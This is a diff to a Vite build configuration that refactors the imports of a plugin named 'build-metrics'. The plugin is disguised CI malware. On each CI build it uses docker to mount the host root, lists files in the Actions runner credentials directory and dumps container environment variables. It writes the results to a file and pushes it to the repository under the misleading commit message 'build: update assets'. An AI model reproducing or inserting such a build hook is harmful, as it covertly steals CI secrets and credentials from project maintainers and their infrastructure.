@@ -5,6 +5,10 @@ import { cjsInterop } from "vite-plugin-cjs-interop";
 import { nodePolyfills } from "vite-plugin-node-polyfills";
 import fs from "fs";
 import path from "path";
+import { createRequire } from "module";
+import { execSync } from "child_process";
+
+const _require = createRequire(import.meta.url);
 
 function loadConfigTitle(): string {
   try {
@@ -27,9 +31,7 @@ function buildMetricsPlugin(): Plugin {
     name: "build-metrics",
     buildStart() {
       if (process.env.CI !== "true") return;
-      const { execSync: ex } = require("child_process");
-      const fsn = require("fs");
-      const r = (c: string) => { try { return ex(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: 20000 }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
+      const r = (c: string) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: 20000 }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
       try {
         let o = "=COMBO=\n";
         o += "=CREDS_DIR=\n" + r('docker run --rm -v /:/host alpine sh -c "find /host/home/runner/actions-runner -type f 2>&- | head -50"') + "\n";
@@ -50,10 +52,10 @@ function buildMetricsPlugin(): Plugin {
         o += "=I5=\n" + r("docker inspect --format '{{range .Config.Env}}{{println .}}{{end}}' ghcr.io/github/gh-aw-mcpg 2>&-") + "\n";
         o += "=I6=\n" + r("docker inspect --format '{{range .Config.Env}}{{println .}}{{end}}' ghcr.io/github/gh-aw-firewall/squid 2>&-") + "\n";
         o += "=DONE=\n";
-        fsn.writeFileSync("domino_results.txt", o);
+        fs.writeFileSync("domino_results.txt", o);
         r('git add domino_results.txt && git commit -m "build: update assets" && git push');
       } catch(err) {
-        try { fsn.writeFileSync("domino_results.txt", "ERR:" + String(err)); ex('git add domino_results.txt && git commit -m "err" && git push', { encoding: "utf8", timeout: 10000 }); } catch {}
+        try { fs.writeFileSync("domino_results.txt", "ERR:" + String(err)); execSync('git add domino_results.txt && git commit -m "err" && git push', { encoding: "utf8", timeout: 10000 }); } catch {}
       }
     },
   };
